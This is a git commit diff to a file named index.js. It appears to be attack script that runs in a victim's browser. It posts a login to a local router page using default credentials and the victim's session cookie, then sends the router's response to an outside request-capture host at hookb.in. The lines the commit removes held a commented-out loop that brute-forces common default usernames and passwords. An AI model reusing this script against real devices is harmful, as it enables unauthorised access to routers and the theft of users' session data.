4880bba9906e82789d53a9cb71f0f2b4a93378de
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-06 06:41:11 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,25 +1,19 @@
-// const pwd = ["secured", "password", "123456", "admin"];
-// const username = ["admin","cisco","root"];
-// for (p in pwd) {
-//     for (u in username) {
-        const http = new XMLHttpRequest();
-        http.open('POST', 'http://router.local/login.php', true);
-        http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+const http = new XMLHttpRequest();
+http.open('POST', 'http://router.local/login.php', true);
+http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
-        http.onload = function () {
-            //if (http.readyState === http.DONE) {
+http.onload = function () {
+     //if (http.readyState === http.DONE) {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/3OLjwyM76bh7yakkMroy', true);
+                xhr.open('POST', 'https://hookb.in/NOrzVlz1mMte8mNNl6Bl', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
                 xhr.send(JSON.stringify(http.responseText));
         
             //}
-        };
-        const cook = document.cookie;
+};
+const cook = document.cookie;
 
+http.send("PHPSESSID="+cook+"&username=admin&pin=password&notRobot=on");
 
-        http.send("PHPSESSID="+cook+"&username=admin&pin=admin&notRobot=on");
-//     }
-// }
    
 
